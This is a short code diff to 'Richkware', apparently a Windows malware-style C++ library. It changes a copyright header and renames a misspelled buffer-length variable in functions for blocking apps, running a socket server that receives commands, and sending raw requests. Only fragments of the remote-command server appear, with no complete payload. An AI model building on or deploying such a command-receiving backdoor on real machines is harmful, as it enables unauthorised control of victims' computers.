@@ -1,5 +1,5 @@
 /*
- *      Author: Riccardo Melioli
+ *      Copyright 2016 Riccardo Melioli. All Rights Reserved.
  */
 
 #include "Richkware.h"
@@ -133,7 +133,7 @@ BlockAppsThread(void* arg) {
 
 }
 
-int Richkware::StartServer(const char* port, int bufferLenght) {
+int Richkware::StartServer(const char* port, int bufferlength) {
 	WSADATA wsaData;
 	int iResult;
 
@@ -221,15 +221,15 @@ int Richkware::StartServer(const char* port, int bufferLenght) {
 }
 
 DWORD WINAPI ClientSocketThread(void* CS) {
-	int bufferLenght = 512;
+	int bufferlength = 512;
 	SOCKET ClientSocket = (SOCKET) CS;
 
 	int iResult;
 
 	std::string command;
 	int iSendResult;
-	char recvbuf[bufferLenght];
-	int recvbuflen = bufferLenght;
+	char recvbuf[bufferlength];
+	int recvbuflen = bufferlength;
 	std::size_t posSubStr;
 	// write the output of command in a file
 	char tmp_path[MAX_PATH];
@@ -306,14 +306,14 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 }
 
 const char* Richkware::RawRequest(const char* serverAddress, const char* port,
-		const char* request, int bufferLenght) {
+		const char* request, int bufferlength) {
 	WSADATA wsaData;
 	SOCKET ConnectSocket = INVALID_SOCKET;
 	struct addrinfo *result = NULL, *ptr = NULL, hints;
 	const char* sendbuf = request;
-	char recvbuf[bufferLenght];
+	char recvbuf[bufferlength];
 	int iResult;
-	int recvbuflen = bufferLenght;
+	int recvbuflen = bufferlength;
 	std::string response;
 
 	// Initialize Winsock
